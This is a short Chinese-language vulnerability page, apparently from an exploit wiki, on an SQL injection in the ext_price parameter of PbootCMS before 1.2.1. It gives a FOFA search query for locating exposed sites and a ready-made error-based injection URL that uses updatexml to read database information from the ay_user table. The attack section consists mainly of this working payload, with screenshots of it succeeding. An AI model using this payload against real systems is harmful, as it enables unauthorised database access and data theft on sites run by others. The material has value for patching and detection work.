# PbootCMS ext_price SQL注入漏洞

## 漏洞描述

PbootCMS 存在SQL注入漏洞。通过漏洞可获取数据库敏感信息

## 漏洞影响

> [!NOTE]
>
> PbootCMS < 1.2.1

## FOFA

> [!NOTE]
>
> app="PBOOTCMS"

## 漏洞复现

主页

![image-20210702113507454](http://wikioss.peiqi.tech/vuln/image-20210702113507454.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)

测试 Payload

```
/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123](http://127.0.0.1/PbootCMS/index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/distinct/**/concat(0x23,user(),0x23)/**/FROM/**/ay_user/**/limit/**/0,1),0x7e),1));%23=123)
```

![image-20210702113552582](http://wikioss.peiqi.tech/vuln/image-20210702113552582.png?x-oss-process=image/auto-orient,1/quality,q_90/watermark,image_c2h1aXlpbi9zdWkucG5nP3gtb3NzLXByb2Nlc3M9aW1hZ2UvcmVzaXplLFBfMTQvYnJpZ2h0LC0zOS9jb250cmFzdCwtNjQ,g_se,t_17,x_1,y_10)